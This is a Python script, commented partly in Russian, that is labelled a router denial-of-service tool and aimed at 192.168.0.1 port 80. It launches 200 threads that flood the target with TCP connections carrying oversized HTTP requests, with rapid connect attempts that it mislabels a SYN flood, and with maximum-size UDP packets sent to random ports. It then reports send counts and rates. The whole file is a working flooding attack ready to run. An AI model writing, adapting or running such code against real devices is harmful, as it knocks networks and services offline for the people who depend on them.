import socket
import threading
import time
import random
import sys
from datetime import datetime

# ============================================================
#  Router DoS — TCP/UDP Flood
#  Target: 192.168.0.1:80
#  Duration: 5-10 seconds
# ============================================================

TARGET_IP   = "192.168.0.1"
TARGET_PORT = 80
THREADS     = 200
DURATION    = random.randint(5, 10)  # 5-10 секунд
PAYLOAD     = b"\x00" * 65500  # максимальный UDP-пакет

stop_flag = threading.Event()
stats = {"tcp": 0, "udp": 0, "errors": 0}
lock = threading.Lock()


def tcp_flood():
    """TCP flood — открытые соединения на порт 80"""
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, TARGET_PORT))
            # Hold connection open, send garbage
            s.send(b"GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n" + b"A" * 4000 + b"\r\n\r\n")
            with lock:
                stats["tcp"] += 1
            s.close()
        except Exception:
            with lock:
                stats["errors"] += 1


def tcp_syn_flood():
    """Raw TCP SYN flood — засыпаем SYN-пакетами без завершения handshake"""
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            # SYN without completing handshake — half-open connections
            s.connect_ex((TARGET_IP, TARGET_PORT))
            with lock:
                stats["tcp"] += 1
            s.close()
        except Exception:
            with lock:
                stats["errors"] += 1


def udp_flood():
    """UDP flood — максимальные пакеты на рандомные порты"""
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            port = random.randint(1, 65535)
            s.sendto(PAYLOAD, (TARGET_IP, port))
            with lock:
                stats["udp"] += 1
            s.close()
        except Exception:
            with lock:
                stats["errors"] += 1


def main():
    print(f"[*] Цель: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Потоков: {THREADS}")
    print(f"[*] Длительность: {DURATION} сек")
    print(f"[*] Старт: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
    print("-" * 50)

    threads = []

    # Распределение потоков: 40% TCP flood, 30% SYN flood, 30% UDP flood
    tcp_count  = int(THREADS * 0.4)
    syn_count  = int(THREADS * 0.3)
    udp_count  = THREADS - tcp_count - syn_count

    for _ in range(tcp_count):
        t = threading.Thread(target=tcp_flood, daemon=True)
        t.start()
        threads.append(t)

    for _ in range(syn_count):
        t = threading.Thread(target=tcp_syn_flood, daemon=True)
        t.start()
        threads.append(t)

    for _ in range(udp_count):
        t = threading.Thread(target=udp_flood, daemon=True)
        t.start()
        threads.append(t)

    # Отсчёт
    start = time.time()
    while time.time() - start < DURATION:
        elapsed = int(time.time() - start)
        remaining = DURATION - elapsed
        with lock:
            total = stats["tcp"] + stats["udp"]
            print(f"\r[+] {elapsed}s / {DURATION}s | TCP: {stats['tcp']} | "
                  f"UDP: {stats['udp']} | ERR: {stats['errors']} | "
                  f"Total: {total}", end="", flush=True)
        time.sleep(0.5)

    stop_flag.set()

    print("\n" + "-" * 50)
    print(f"[*] Стоп: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")

    # Ждём завершения потоков
    for t in threads:
        t.join(timeout=2)

    with lock:
        total = stats["tcp"] + stats["udp"]
        print(f"\n[=== ИТОГ ===]")
        print(f"    TCP пакетов/коннектов: {stats['tcp']}")
        print(f"    UDP пакетов:           {stats['udp']}")
        print(f"    Ошибок:                {stats['errors']}")
        print(f"    Всего отправлено:      {total}")
        print(f"    Длительность:          {DURATION} сек")
        print(f"    Скорость:              {total // DURATION if DURATION > 0 else 0} оп/сек")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_flag.set()
        print("\n[!] Прервано вручную")
        sys.exit(0)
